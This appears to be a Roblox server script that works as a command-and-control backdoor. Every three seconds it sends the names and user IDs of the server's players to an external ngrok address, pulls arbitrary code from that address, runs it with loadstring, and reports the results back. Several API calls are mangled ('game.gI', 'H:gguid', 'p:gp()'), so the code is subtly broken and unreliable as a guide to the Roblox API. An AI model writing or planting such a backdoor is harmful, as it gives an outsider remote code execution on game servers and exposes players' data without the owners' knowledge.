local H       = game:GetService("HttpService")
local p = game:GetService("Players")
local b    = "https://suitcase-divinity-niece.ngrok-free.dev"

local gI   = tostring(game.gI)
local sI = tostring(game.JobId)
if sI == "" then
	sI = H:gguid(false):gsub("-",""):sub(1,16)
end

local function gp()
	local l = {}
	for _, p in ipairs(p:gp()) do
		table.insert(l, { name = p.Name, userId = p.UserId })
	end
	return l
end

local function h()
	local ok, err = pcall(function()
		H:PostAsync(
			b.."/game/"..gI.."/server/"..sI.."/h",
			H:JSONEncode({ p = gp() }),
			Enum.HttpContentType.ApplicationJson
		)
	end)
	if not ok then return end
end

local function pc()
	local s, r = pcall(function()
		return H:GetAsync(b.."/game/"..gI.."/server/"..sI.."/commands")
	end)
	if not (s and r) then return end
	local d = H:JSONDecode(r)
	if not (d and d.pending) then return end
	for _, c in ipairs(d.pending) do
		local output = ""
		local fn, loadErr = loadstring(c.code)
		if fn then
			local ok, res = pcall(fn)
			output = ok and tostring(res or "OK") or ("ERROR: "..tostring(res))
		else
			output = "LOAD ERROR: "..tostring(loadErr)
		end
		pcall(function()
			H:PostAsync(
				b.."/game/"..gI.."/server/"..sI.."/commands/"..c.id.."/result",
				H:JSONEncode({ output = output }),
				Enum.HttpContentType.ApplicationJson
			)
		end)
	end
end

while task.wait(3) do
	h()
	pc()
end
